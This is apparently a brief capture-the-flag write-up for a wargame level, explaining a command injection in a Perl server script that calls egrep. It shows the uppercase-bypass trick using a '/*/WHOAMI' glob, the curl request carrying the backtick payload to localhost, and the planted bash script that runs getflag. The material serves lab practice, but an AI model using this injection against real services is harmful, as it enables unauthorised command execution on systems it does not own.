Ok so in this one we have the code from a server running on the host

We can see that egrep, a bush function is called
thus, let's look at injection

The input we give is set to uppercase, that's a no good for paths
Thankfully, the thing uses regex, so we can slot a /*/FILE 
to invoke it
This looks something with local FILE

/level12.pl x='`/*/whoami`' y="1" && echo $?

we have a /tmp/WHOAMI file with our payload as a bash script that simply calls getflag and logs it

curl 'localhost:4646?x=`/*/whoami`'

#!/bin/bash
getflag > /tmp/logfile
